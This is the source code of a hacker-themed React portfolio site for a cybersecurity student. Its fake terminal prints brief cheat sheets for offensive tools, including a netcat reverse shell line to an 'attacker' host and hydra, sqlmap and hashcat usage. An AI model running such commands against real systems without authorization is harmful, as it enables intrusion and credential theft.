"use client";

import { useState, useEffect, useRef } from "react";
import {
  Github, Linkedin, Mail, Terminal, Shield, Code,
  ExternalLink, Award, FileText, Download, ChevronRight,
} from "lucide-react";

/* ── Styles ─────────────────────────────────────────────────────── */
const S = {
  page:      { minHeight: "100vh", backgroundColor: "#000", color: "#00ff41", fontFamily: "'Courier New', Courier, monospace", overflowX: "hidden" },
  nav:       { position: "fixed", top: 0, width: "100%", zIndex: 50, backgroundColor: "rgba(0,0,0,0.95)", borderBottom: "1px solid #1a5c2a", backdropFilter: "blur(4px)" },
  navInner:  { maxWidth: 1200, margin: "0 auto", padding: "12px 20px", display: "flex", justifyContent: "space-between", alignItems: "center" },
  navLogo:   { display: "flex", alignItems: "center", gap: 8, fontSize: 18, fontWeight: "bold" },
  navLinks:  { display: "flex", gap: 20, fontSize: 13 },
  navLink:   { color: "#00ff41", textDecoration: "none", transition: "color 0.2s" },
  section:   { padding: "64px 20px" },
  container: { maxWidth: 1100, margin: "0 auto" },
  heading:   { fontSize: "clamp(26px, 4vw, 36px)", fontWeight: "bold", marginBottom: 40, textAlign: "center" },
  card:      { border: "1px solid #1a5c2a", padding: "20px", backgroundColor: "rgba(0,0,0,0.7)", transition: "border-color 0.3s", cursor: "default" },
  tag:       { padding: "2px 10px", fontSize: 11, border: "1px solid #1a5c2a", color: "#00cc33", display: "inline-block" },
  btn:       { padding: "10px 20px", fontFamily: "'Courier New', Courier, monospace", cursor: "pointer", fontSize: 13, fontWeight: "bold", transition: "all 0.2s", display: "inline-flex", alignItems: "center", gap: 6 },
  btnPrimary:{ backgroundColor: "#00ff41", color: "#000", border: "none", boxShadow: "0 0 16px rgba(0,255,65,0.4)" },
  btnOutline:{ backgroundColor: "transparent", color: "#00ff41", border: "1px solid #00ff41" },
  grid2:     { display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: 20 },
  grid3:     { display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(260px, 1fr))", gap: 20 },
  termBox:   { border: "1px solid #1a5c2a", backgroundColor: "rgba(0,0,0,0.9)", padding: "12px 16px", marginBottom: 12, maxHeight: 220, overflowY: "auto", fontSize: 13, lineHeight: 1.6 },
  footer:    { borderTop: "1px solid #0d2e16", padding: "20px", textAlign: "center", color: "#1a5c2a", fontSize: 12 },
};

/* ── Data ───────────────────────────────────────────────────────── */
const COMMANDS = {
  help: `Available Commands:
─────────────────────────────────────────
  nmap        Network exploration tool
  metasploit  Penetration testing framework
  burpsuite   Web application security
  wireshark   Network protocol analyzer
  hydra       Password cracking tool
  sqlmap      SQL injection tool
  aircrack    Wireless network security
  john        Password cracker
  hashcat     Advanced password recovery
  netcat      Networking utility
  tcpdump     Network packet analyzer
  whoami      About this hacker
  clear       Clear terminal
─────────────────────────────────────────`,
  whoami: `> Yash Chandankhede | Cybersecurity Enthusiast & Frontend Developer
> Engineering student | CTF Player
> Stack: React, Next.js, Express.js, Python, Java, Kali Linux`,
  nmap: `NMAP — Network Mapper v7.94
─────────────────────────────────────────
Purpose : Network discovery & security auditing
Usage   : nmap [options] [target]

Common flags:
  -sV        Detect service versions
  -p-        Scan all 65535 ports
  -O         OS detection
  -A         Aggressive scan
  --script   Run NSE scripts

Example : nmap -sV -p- 192.168.1.1`,
  metasploit: `METASPLOIT FRAMEWORK v6.3
─────────────────────────────────────────
Purpose : Penetration testing & exploit dev
Usage   : msfconsole

Key modules:
  exploit/   Attack vectors
  payload/   Code executed on target
  auxiliary/ Scanning & fuzzing
  post/      Post-exploitation

Workflow: search → use → set RHOSTS → run`,
  burpsuite: `BURP SUITE Professional
─────────────────────────────────────────
Purpose : Web application security testing

Tools:
  Proxy      Intercept browser traffic
  Scanner    Automated vulnerability detection
  Intruder   Automated attack engine
  Repeater   Manual HTTP request manipulation
  Decoder    Encode/decode/hash data

Best for: OWASP Top 10 web vulnerabilities`,
  wireshark: `WIRESHARK v4.x
─────────────────────────────────────────
Purpose : Network protocol analyzer

Features:
  • Deep packet inspection (1000+ protocols)
  • Live capture & offline analysis
  • Powerful display filters
  • VoIP call reconstruction

Filter examples:
  tcp.port == 80     HTTP traffic
  http.request       HTTP requests only`,
  hydra: `HYDRA v9.4
─────────────────────────────────────────
Purpose : Fast parallel network login cracker

Protocols: SSH, FTP, HTTP, HTTPS, SMB,
           MySQL, PostgreSQL, RDP, Telnet

Usage   : hydra -l user -P wordlist.txt ssh://target
Options :
  -l / -L    Username / Username list
  -P         Password list
  -t 4       Threads

⚠ Use only on authorized systems!`,
  sqlmap: `SQLMAP v1.7
─────────────────────────────────────────
Purpose : Automatic SQL injection tool

Detection: Boolean, Error, Union, Time-based

Usage   : sqlmap -u "http://target.com?id=1"
Options :
  --dbs        Enumerate databases
  --tables     Enumerate tables
  --dump       Extract data
  --os-shell   OS command execution`,
  aircrack: `AIRCRACK-NG Suite
─────────────────────────────────────────
Purpose : WiFi network security auditing

Tools:
  airmon-ng    Enable monitor mode
  airodump-ng  Capture packets
  aireplay-ng  Packet injection
  aircrack-ng  WEP/WPA/WPA2 cracking

Workflow:
  1. airmon-ng start wlan0
  2. airodump-ng wlan0mon
  3. aircrack-ng cap.cap -w rockyou.txt`,
  john: `JOHN THE RIPPER v1.9
─────────────────────────────────────────
Purpose : Password cracking tool

Modes: Single, Wordlist, Incremental, External
Usage : john --wordlist=rockyou.txt hashes.txt

Formats: MD5, SHA-1, bcrypt, NTLM, Kerberos
Tip    : Use --format=<type> to specify hash`,
  hashcat: `HASHCAT v6.2.6
─────────────────────────────────────────
Purpose : GPU-accelerated password recovery

Modes:
  0   Dictionary   3   Brute-force
  1   Combination  6   Hybrid

Usage : hashcat -m 0 -a 0 hashes.txt rockyou.txt
-m    : Hash type (0=MD5, 1000=NTLM, 1800=sha512)`,
  netcat: `NETCAT — TCP/IP Swiss Army Knife
─────────────────────────────────────────
Use cases:
  Port scan     nc -zv host 1-1024
  Banner grab   nc host port
  File transfer nc -l 4444 > file.txt
  Reverse shell nc -e /bin/sh attacker 4444
  Listener      nc -lvp 4444`,
  tcpdump: `TCPDUMP v4.99
─────────────────────────────────────────
Purpose : CLI packet analyzer
Usage   : tcpdump [options] [filter]

Filters:
  port 80          HTTP traffic
  host 192.168.1.1 Specific host
  not port 22      Exclude SSH

Options:
  -i eth0      Specify interface
  -w out.pcap  Save for Wireshark
  -n           Don't resolve hostnames`,
};

const PROJECTS = [
  {
    title: "DeepWatch: Child Safety Dashboard",
    desc: "Dark Web CSAM Tracking System designed to monitor, detect and identify perpetrators involved in child pornography activities on the dark web.",
    tags: ["Python", "Scapy", "Security"],
    github: "https://github.com/YashOO7-cyb/Deepwatch_CyberHack_2025",
    demo: "https://codedefenders.netlify.app/",
  },
  {
    title: "CyberSentinel: CodeDefenders Suite",
    desc: "Chrome extension for real-time cybersecurity threat detection and protection. Next.js-based dashboard and UI for monitoring, alerting and configuration.",
    tags: ["React", "Node.js", "AuthO"],
    github: "https://github.com/silent-garv/codeDefenders_CIH_2.0",
    demo: "https://code-defenders-cih-2-0.vercel.app/",
  },
  {
    title: "ComfortCast: Smart Weather App",
    desc: "A weather application that provides real-time forecasts, historical data and comfort predictions based on location and previous weather patterns.",
    tags: ["React", "Express", "OpenMeteo API"],
    github: "https://github.com/silent-garv/NASA_SPACE_APP",
    demo: "https://nasa-space-app-flame.vercel.app/",
  },
];

const CERTS = [
  { title: "Junior Cybersecurity Analyst Career Path", issuer: "Cisco",   year: "2022", Icon: Shield, link: "https://www.credly.com/badges/09b0e19c-4590-43a1-b259-9b28902d55b9/public_url" },
  { title: "Cybersecurity Job Simulation", issuer: "Forage", year: "2023-2025", Icon: Shield, link: "https://drive.google.com/file/d/1QOIUyQJSxIBozu6I-WDWROF3P-yJhXMF/view" },
  { title: "LFW111: Introduction to Node.js", issuer: "The Linux Foundation", year: "2025", Icon: Award, link: "https://www.credly.com/badges/e656db15-04d8-4775-8998-e5d93111fd01/public_url" }, 
  { title: "Oracle Cloud Infrastructure 2025 Certified Professional", issuer: "Oracle", year:"2025", Icon: Code, link: "https://drive.google.com/file/d/1m5PpttsNJemTG4rmV-k3_sulKRFx1DCl/view" },
  { title: "Google Cloud Cybersecurity Certificate", issuer: "Google Cloud Skills Boost", year: "2025", Icon: Code, link: "https://www.credly.com/badges/f47091f7-27bc-4f9b-b87b-1e499a05f953/public_url" }, 
  { title: "Google Cloud Data Analytics Certificate", issuer: "Google Cloud Skills Boost", year: "2025", Icon: Code, link: "https://www.credly.com/badges/1779897a-a882-4ef5-b9a4-721ba52a6dc4/public_url" },
];

const SKILLS = {
  "Cybersecurity":  ["Penetration Testing", "Vulnerability Assessment", "Network Security", "OWASP Top 10", "Kali Linux", "Metasploit", "CTFs"],
  "Programming":    ["Python", "JavaScript", "Java", "C/C++", "SQL", "MongoDB", "Firebase"],
  "Frontend":       ["React", "Next.js", "HTML/CSS", "Tailwind CSS", "Express.js"],
  "Tools":          ["Burp Suite", "Wireshark", "Nmap", "John the Ripper", "Hashcat", "Aircrack-ng", "Ghidra"],
};

/* ── Component ──────────────────────────────────────────────────── */
export default function HackerPortfolio() {
  const [input,       setInput]       = useState("");
  const [history,     setHistory]     = useState([
    { type: "sys", text: "┌──(root㉿kali)-[~]" },
    { type: "sys", text: "└─# Welcome. Type 'help' for commands, or try 'whoami'." },
  ]);
  const [blink,       setBlink]       = useState(true);
  const [easterEgg,   setEasterEgg]   = useState(false);
  const [mobileMenu,  setMobileMenu]  = useState(false);
  const [isMobile,    setIsMobile]    = useState(false);
  const termEnd  = useRef(null);
  const inputRef = useRef(null);

  useEffect(() => {
    const t = setInterval(() => setBlink(p => !p), 530);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    const check = () => setIsMobile(window.innerWidth < 768);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);

  const runCmd = (e) => {
    e.preventDefault();
    const raw = input.trim();
    if (!raw) return;
    const cmd = raw.toLowerCase();
    const next = [...history, { type: "input", text: raw }];

    if (cmd.includes("yash")) {
      setEasterEgg(true);
      setTimeout(() => setEasterEgg(false), 4000);
      next.push({ type: "special", text: "🎉 Easter Egg unlocked! Welcome, Yash!" });
    } else if (cmd === "clear") {
      setHistory([{ type: "sys", text: "└─# Terminal cleared. Type 'help' for commands." }]);
      setInput("");
      return;
    } else if (COMMANDS[cmd]) {
      next.push({ type: "output", text: COMMANDS[cmd] });
    } else {
      next.push({ type: "error", text: `bash: ${raw}: command not found\nType 'help' for available commands.` });
    }
    setHistory(next);
    setInput("");
  };

  const navLinks = ["About", "Skills", "Projects", "Certs", "Contact"];

  return (
    <div style={S.page}>

      {/* ── Easter Egg ─────────────────────────────────────────────── */}
      {easterEgg && (
        <div style={{ position: "fixed", inset: 0, zIndex: 200, backgroundColor: "rgba(0,0,0,0.97)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
          <pre style={{ color: "#00ff41", fontFamily: "monospace", fontSize: "clamp(9px, 2.2vw, 30px)", lineHeight: 1.15, textShadow: "0 0 8px #00ff41, 0 0 20px #00ff41, 0 0 40px #00ff41", whiteSpace: "pre", animation: "flicker 0.1s infinite alternate" }}>
{`██╗   ██╗ █████╗ ███████╗██╗  ██╗
╚██╗ ██╔╝██╔══██╗██╔════╝██║  ██║
 ╚████╔╝ ███████║███████╗███████║
  ╚██╔╝  ██╔══██║╚════██║██╔══██║
   ██║   ██║  ██║███████║██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`}
          </pre>
          <p style={{ color: "#00ff41", marginTop: 28, fontSize: "clamp(12px, 2vw, 20px)", textShadow: "0 0 8px #00ff41", animation: "pulse 1s infinite" }}>
            ★ SECRET UNLOCKED — Welcome, Yash! ★
          </p>
        </div>
      )}

      {/* ── Nav ────────────────────────────────────────────────────── */}
      <nav style={S.nav}>
        <div style={S.navInner}>
          <div style={S.navLogo}>
            <Terminal size={18} color="#00ff41" />
            <span style={{ color: "#00ff41" }}>&gt;_</span>
            <span style={{ color: "#fff" }}>Yash</span>
          </div>

          {!isMobile && (
            <div style={S.navLinks}>
              {navLinks.map(l => (
                <a key={l} href={`#${l.toLowerCase()}`} style={S.navLink}
                  onMouseEnter={e => e.target.style.color = "#fff"}
                  onMouseLeave={e => e.target.style.color = "#00ff41"}>
                  [{l}]
                </a>
              ))}
            </div>
          )}

          {isMobile && (
            <button onClick={() => setMobileMenu(!mobileMenu)}
              style={{ background: "none", border: "none", color: "#00ff41", fontSize: 22, cursor: "pointer" }}>
              {mobileMenu ? "✕" : "☰"}
            </button>
          )}
        </div>

        {isMobile && mobileMenu && (
          <div style={{ backgroundColor: "#000", borderTop: "1px solid #1a5c2a", padding: "12px 20px", display: "flex", flexDirection: "column", gap: 12 }}>
            {navLinks.map(l => (
              <a key={l} href={`#${l.toLowerCase()}`} onClick={() => setMobileMenu(false)}
                style={{ color: "#00ff41", textDecoration: "none", fontSize: 14 }}>
                [{l}]
              </a>
            ))}
          </div>
        )}
      </nav>

      {/* ── Hero ───────────────────────────────────────────────────── */}
      <section style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: "90px 20px 40px" }}>
        <div style={{ maxWidth: 1100, width: "100%" }}>
          <div style={{ border: "2px solid #1a5c2a", padding: isMobile ? 16 : 32, backgroundColor: "rgba(0,0,0,0.6)", boxShadow: "0 0 40px rgba(0,255,65,0.15)" }}>

            {/* Terminal chrome */}
            <div style={{ display: "flex", alignItems: "center", gap: 7, marginBottom: 12, paddingBottom: 10, borderBottom: "1px solid #0d2e16" }}>
              {["#ff5f57","#febc2e","#28c840"].map((c,i) => (
                <div key={i} style={{ width: 12, height: 12, borderRadius: "50%", backgroundColor: c, opacity: 0.85 }} />
              ))}
              <span style={{ marginLeft: 8, color: "#1a5c2a", fontSize: 12 }}>kali@terminal — bash</span>
            </div>

            {/* Terminal output */}
            <div
              ref={null}
              style={S.termBox}
              onClick={() => inputRef.current?.focus()}
            >
              {history.map((item, i) => (
                <div key={i} style={{ marginBottom: 2 }}>
                  {item.type === "input" && (
                    <div>
                      <span style={{ color: "#00cc33" }}>┌──(root㉿kali)-[~]</span><br />
                      <span style={{ color: "#00cc33" }}>└─# </span>
                      <span style={{ color: "#fff" }}>{item.text}</span>
                    </div>
                  )}
                  {item.type === "sys"    && <div style={{ color: "#1a7a34" }}>{item.text}</div>}
                  {item.type === "output" && <div style={{ color: "#00cc33", whiteSpace: "pre-wrap" }}>{item.text}</div>}
                  {item.type === "error"  && <div style={{ color: "#ff4444", whiteSpace: "pre-wrap" }}>{item.text}</div>}
                  {item.type === "special"&& <div style={{ color: "#ffe066", fontWeight: "bold" }}>{item.text}</div>}
                </div>
              ))}
              <div ref={termEnd} />
            </div>

            {/* Terminal input */}
            <form onSubmit={runCmd} style={{ marginBottom: 24 }}>
              <div style={{ display: "flex", alignItems: "center", flexWrap: "wrap", gap: 4, fontSize: 13 }}>
                <span style={{ color: "#00cc33", whiteSpace: "nowrap" }}>┌──(root㉿kali)-[~]</span>
                <div style={{ width: "100%" }} />
                <span style={{ color: "#00cc33", whiteSpace: "nowrap" }}>└─#</span>
                <input
                  ref={inputRef}
                  type="text"
                  value={input}
                  onChange={e => setInput(e.target.value)}
                  style={{ flex: 1, minWidth: 0, backgroundColor: "transparent", border: "none", outline: "none", color: "#fff", fontFamily: "'Courier New', monospace", fontSize: 13, marginLeft: 6 }}
                  placeholder="type 'help'…"
                  autoComplete="off"
                  spellCheck={false}
                />
                <span style={{ color: "#00ff41", opacity: blink ? 1 : 0, transition: "opacity 0.1s" }}>█</span>
              </div>
            </form>

            {/* Divider */}
            <div style={{ borderTop: "1px solid #0d2e16", marginBottom: 28 }} />

            {/* Intro grid */}
            <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr" : "1fr 1fr", gap: 32, alignItems: "center" }}>
              <div>
                <p style={{ color: "#1a7a34", fontSize: 13, marginBottom: 8 }}># About Me</p>
                <h1 style={{ fontSize: "clamp(28px, 4vw, 48px)", color: "#fff", fontWeight: "bold", lineHeight: 1.15, marginBottom: 8 }}>
                  CYBERSECURITY<br />
                  <span style={{ color: "#00ff41" }}>ENTHUSIAST</span>
                </h1>
                <h2 style={{ fontSize: "clamp(16px, 2vw, 22px)", color: "#00cc33", marginBottom: 18, fontWeight: "normal" }}>
                  & Frontend Developer
                </h2>
                <p style={{ color: "#00aa2a", fontSize: "clamp(13px, 1.5vw, 16px)", lineHeight: 1.7, marginBottom: 24 }}>
                  Engineering student with a passion for{" "}
                  <strong style={{ color: "#fff" }}>ethical hacking</strong> and{" "}
                  <strong style={{ color: "#fff" }}>cybersecurity</strong>. I possess skills in
                  penetration testing, vulnerability assessments, building secure web
                  applications and creating engaging user experiences. Always learning, always hacking (ethically).
                </p>
                <div style={{ display: "flex", gap: 12, flexWrap: "wrap" }}>
                  <a href="#projects" style={{ ...S.btn, ...S.btnPrimary, textDecoration: "none" }}>
                    [View Projects] →
                  </a>
                  <a
                    href="/resume.pdf"
                    download
                    style={{ ...S.btn, ...S.btnOutline, textDecoration: "none" }}
                    onMouseEnter={e => { e.currentTarget.style.backgroundColor = "#00ff41"; e.currentTarget.style.color = "#000"; }}
                    onMouseLeave={e => { e.currentTarget.style.backgroundColor = "transparent"; e.currentTarget.style.color = "#00ff41"; }}
                  >
                    <Download size={14} /> [Download Resume]
                  </a>
                </div>
              </div>

              {/* Profile photo */}
              <div style={{ display: "flex", justifyContent: isMobile ? "center" : "flex-end" }}>
                <div style={{ position: "relative", width: 260, height: 260 }}>
                  {/* Glow ring */}
                  <div style={{ position: "absolute", inset: 0, borderRadius: "50%", border: "2px solid rgba(0,255,65,0.6)", animation: "glowPulse 2.5s ease-in-out infinite" }} />
                  {/* Inner ring */}
                  <div style={{ position: "absolute", inset: 8, borderRadius: "50%", border: "1px solid rgba(0,255,65,0.3)" }} />
                  {/* Photo — replace src with "/profile.jpg" */}
                  <img
                    src="profile.jpeg"
                    alt="Yash"
                    onError={e => { e.target.src = "https://images.unsplash.com/photo-1568602471122-7832951cc4c5?w=400&h=400&fit=crop&crop=face"; }}
                    style={{ position: "absolute", inset: 14, width: "calc(100% - 28px)", height: "calc(100% - 28px)", borderRadius: "50%", objectFit: "cover", border: "1px solid rgba(0,255,65,0.4)", filter: "brightness(0.9) saturate(0.85)" }}
                  />
                  {/* Scan line */}
                  <div style={{ position: "absolute", inset: 14, borderRadius: "50%", overflow: "hidden", pointerEvents: "none" }}>
                    <div style={{ position: "absolute", left: 0, right: 0, height: 3, background: "linear-gradient(to bottom, transparent, rgba(0,255,65,0.85), transparent)", animation: "scanLine 2.5s linear infinite", boxShadow: "0 0 8px rgba(0,255,65,0.9)" }} />
                  </div>
                  {/* Corner brackets */}
                  {[
                    { top: 0,    left: 0,    borderTop: "2px solid #00ff41", borderLeft:  "2px solid #00ff41" },
                    { top: 0,    right: 0,   borderTop: "2px solid #00ff41", borderRight: "2px solid #00ff41" },
                    { bottom: 0, left: 0,    borderBottom: "2px solid #00ff41", borderLeft:  "2px solid #00ff41" },
                    { bottom: 0, right: 0,   borderBottom: "2px solid #00ff41", borderRight: "2px solid #00ff41" },
                  ].map((s, i) => (
                    <div key={i} style={{ position: "absolute", width: 18, height: 18, ...s }} />
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ── About ──────────────────────────────────────────────────── */}
      <section id="about" style={S.section}>
        <div style={S.container}>
          <h2 style={S.heading}><span style={{ color: "#00ff41" }}>$</span> About <span style={{ color: "#fff" }}>Me</span></h2>
          <div style={S.grid2}>
            {[
              { Icon: Shield, title: "Cybersecurity Geek", text: "Dedicated to mastering ethical hacking and penetration testing. I actively participate in CTF competitions and hackathons to sharpen my skills and make the internet more secure." },
              { Icon: Code,   title: "Frontend Developer",       text: "Building modern, secure and responsive web applications with React and Next.js. I write clean code and implement best security practices for best user experiences." },
            ].map(({ Icon, title, text }) => (
              <div key={title} style={S.card}
                onMouseEnter={e => e.currentTarget.style.borderColor = "#00ff41"}
                onMouseLeave={e => e.currentTarget.style.borderColor = "#1a5c2a"}>
                <Icon size={36} color="#00ff41" style={{ marginBottom: 12 }} />
                <h3 style={{ color: "#fff", fontSize: 18, fontWeight: "bold", marginBottom: 10 }}>{title}</h3>
                <p style={{ color: "#00aa2a", fontSize: 14, lineHeight: 1.7 }}>{text}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── Skills ─────────────────────────────────────────────────── */}
      <section id="skills" style={{ ...S.section, backgroundColor: "rgba(0,40,0,0.1)" }}>
        <div style={S.container}>
          <h2 style={S.heading}><span style={{ color: "#00ff41" }}>$</span> Skills & <span style={{ color: "#fff" }}>Arsenal</span></h2>
          <div style={S.grid2}>
            {Object.entries(SKILLS).map(([cat, items]) => (
              <div key={cat} style={S.card}
                onMouseEnter={e => e.currentTarget.style.borderColor = "#00ff41"}
                onMouseLeave={e => e.currentTarget.style.borderColor = "#1a5c2a"}>
                <h3 style={{ color: "#fff", fontWeight: "bold", marginBottom: 12, fontSize: 15 }}>[{cat}]</h3>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
                  {items.map(s => (
                    <span key={s} style={S.tag}
                      onMouseEnter={e => { e.target.style.backgroundColor = "#00ff41"; e.target.style.color = "#000"; }}
                      onMouseLeave={e => { e.target.style.backgroundColor = "transparent"; e.target.style.color = "#00cc33"; }}>
                      {s}
                    </span>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── Projects ───────────────────────────────────────────────── */}
      <section id="projects" style={S.section}>
        <div style={S.container}>
          <h2 style={S.heading}><span style={{ color: "#00ff41" }}>$</span> Featured <span style={{ color: "#fff" }}>Projects</span></h2>
          <div style={S.grid3}>
            {PROJECTS.map((p, i) => (
              <div key={i} style={{ ...S.card, display: "flex", flexDirection: "column" }}
                onMouseEnter={e => e.currentTarget.style.borderColor = "#00ff41"}
                onMouseLeave={e => e.currentTarget.style.borderColor = "#1a5c2a"}>
                <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 8 }}>
                  <ChevronRight size={14} color="#00ff41" style={{ marginTop: 3, flexShrink: 0 }} />
                  <h3 style={{ color: "#fff", fontSize: 15, fontWeight: "bold" }}>{p.title}</h3>
                </div>
                <p style={{ color: "#00aa2a", fontSize: 13, lineHeight: 1.6, flex: 1, marginBottom: 12 }}>{p.desc}</p>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 6, marginBottom: 14 }}>
                  {p.tags.map(t => <span key={t} style={S.tag}>{t}</span>)}
                </div>
                <div style={{ display: "flex", gap: 16, fontSize: 13 }}>
                  <a href={p.github} target="_blank" rel="noopener noreferrer"
                    style={{ color: "#00ff41", textDecoration: "none", display: "flex", alignItems: "center", gap: 4 }}>
                    <Github size={13} /> [Code]
                  </a>
                  <a href={p.demo} target="_blank" rel="noopener noreferrer"
                    style={{ color: "#00ff41", textDecoration: "none", display: "flex", alignItems: "center", gap: 4 }}>
                    <ExternalLink size={13} /> [Live]
                  </a>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── Certs ──────────────────────────────────────────────────── */}
      <section id="certs" style={{ ...S.section, backgroundColor: "rgba(0,40,0,0.1)" }}>
        <div style={S.container}>
          <h2 style={S.heading}><span style={{ color: "#00ff41" }}>$</span> Certifications & <span style={{ color: "#fff" }}>Credentials</span></h2>
          <div style={S.grid3}>
            {CERTS.map(({ title, issuer, year, Icon, link }, i) => (
              <a key={i} href={link} target="_blank" rel="noopener noreferrer"
                style={{ ...S.card, display: "block", textDecoration: "none" }}
                onMouseEnter={e => e.currentTarget.style.borderColor = "#00ff41"}
                onMouseLeave={e => e.currentTarget.style.borderColor = "#1a5c2a"}>
                <Icon size={36} color="#00ff41" style={{ marginBottom: 12 }} />
                <h3 style={{ color: "#fff", fontSize: 14, fontWeight: "bold", marginBottom: 6 }}>{title}</h3>
                <p style={{ color: "#00cc33", fontSize: 12, marginBottom: 2 }}>{issuer}</p>
                <p style={{ color: "#1a7a34", fontSize: 12, marginBottom: 14 }}>{year}</p>
                <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#00ff41", fontSize: 12 }}>
                  <FileText size={13} /> [View Certificate →]
                </div>
              </a>
            ))}
          </div>
        </div>
      </section>

      {/* ── Contact ────────────────────────────────────────────────── */}
      <section id="contact" style={S.section}>
        <div style={{ ...S.container, maxWidth: 700 }}>
          <h2 style={S.heading}><span style={{ color: "#00ff41" }}>$</span> Get In <span style={{ color: "#fff" }}>Touch</span></h2>
          <div style={{ border: "1px solid #1a5c2a", padding: isMobile ? 24 : 48, backgroundColor: "rgba(0,0,0,0.7)", textAlign: "center", boxShadow: "0 0 30px rgba(0,255,65,0.08)" }}>
            <p style={{ color: "#00aa2a", marginBottom: 32, fontSize: 15, lineHeight: 1.7 }}>
              Interested in collaboration or have a security project in mind?<br />Let's connect!
            </p>
            <div style={{ display: "flex", justifyContent: "center", gap: 16, flexWrap: "wrap" }}>
              {[
                { href: "https://github.com/YashOO7-cyb",   Icon: Github,   label: "GitHub"   },
                { href: "https://www.linkedin.com/in/yash-chandankhede-b5b4bb220",  Icon: Linkedin, label: "LinkedIn" },
                { href: "mailto:yash.chandankhede207@gmail.com",             Icon: Mail,     label: "Email"    },
              ].map(({ href, Icon, label }) => (
                <a key={label} href={href} target="_blank" rel="noopener noreferrer"
                  style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 8, padding: "16px 24px", border: "1px solid #1a5c2a", color: "#00ff41", textDecoration: "none", minWidth: 100, transition: "all 0.2s" }}
                  onMouseEnter={e => { e.currentTarget.style.backgroundColor = "#00ff41"; e.currentTarget.style.color = "#000"; e.currentTarget.style.borderColor = "#00ff41"; }}
                  onMouseLeave={e => { e.currentTarget.style.backgroundColor = "transparent"; e.currentTarget.style.color = "#00ff41"; e.currentTarget.style.borderColor = "#1a5c2a"; }}>
                  <Icon size={22} />
                  <span style={{ fontSize: 12 }}>[{label}]</span>
                </a>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ── Footer ─────────────────────────────────────────────────── */}
      <footer style={S.footer}>
        <p>&gt;_ Built with Next.js | © 2026 Yash Chandankhede</p>
        <p style={{ marginTop: 4, color: "#0d2e16" }}># echo "Stay curious, stay secure"</p>
      </footer>

      <style>{`
        @keyframes scanLine  { 0% { top: -4px; } 100% { top: 100%; } }
        @keyframes glowPulse { 0%,100% { box-shadow: 0 0 0 4px rgba(0,255,65,0.1), 0 0 20px rgba(0,255,65,0.3); } 50% { box-shadow: 0 0 0 6px rgba(0,255,65,0.2), 0 0 40px rgba(0,255,65,0.6); } }
        @keyframes flicker   { from { opacity: 1; } to { opacity: 0.92; } }
        @keyframes pulse     { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
        a:hover { opacity: 0.9; }
      `}</style>
    </div>
  );
}